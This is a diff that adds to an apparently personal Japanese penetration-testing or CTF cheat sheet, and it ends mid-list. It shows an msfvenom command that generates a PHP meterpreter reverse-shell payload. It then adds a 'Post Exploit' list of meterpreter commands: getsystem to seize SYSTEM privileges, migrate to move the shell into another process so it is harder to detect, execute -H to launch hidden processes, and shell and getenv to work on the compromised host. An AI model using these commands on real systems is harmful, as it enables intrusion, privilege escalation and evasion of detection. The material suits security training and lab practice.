@@ -182,3 +182,44 @@ msfvenom --list payloads
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
+
+#### Post Exploit
+1. use/multi/handlerとかでリバースシェルをとってからのアクション。ターゲット端末がどれくらいの時間入力待ち、何も操作をしていない状態(アイドル状態)かをチェックする。  
+```
+idletime
+```
+
+2. ターゲット端末上でSYTEM権限の奪取を試みる。デフォルトでは、SeImpersonatePrivilegeとSeDebugPrivilegeが使われる。
+```
+getsystem
+```
+
+3. 現在のターゲット上でのwhoami情報のようなものを出力する。
+```
+getuid
+```
+
+4. meterpreterセッションから対話型のpowershell等のOSのセッションに入る。これによってmeterpreterのコマンドではなくターゲットOSのシェルコマンドが使えるようになる。
+```
+shell
+```
+
+5. migrate <processId>の形式で指定。現在悪用しているシェルの実行ファイルのプロセスを、指定したプロセスの中に異動する。これによって、ターゲット上でのシステム実行が検出されづらくなる。(virusのような感じ)プロセスは、組み込みファイル等を指定するのがコツ。  
+ちなみに、migrateするとmigrate先のプロセスが実行していたユーザの権限に変更される。
+```
+migrate 5476
+```
+
+6. migrateするときに、シェルプロセスの移行先として適切なprocessがみつからないときに使用すると良い。  
+ターゲット上でプロセスを起動する。  
+-Hで、GUIとして立ち上げないことができる。
+```
+execute -H -f notepad
+```
+
+7. ターゲット環境での環境変数を表示する。引数に環境変数名を指定。
+```
+getenv Flag
+```
+
+8. 
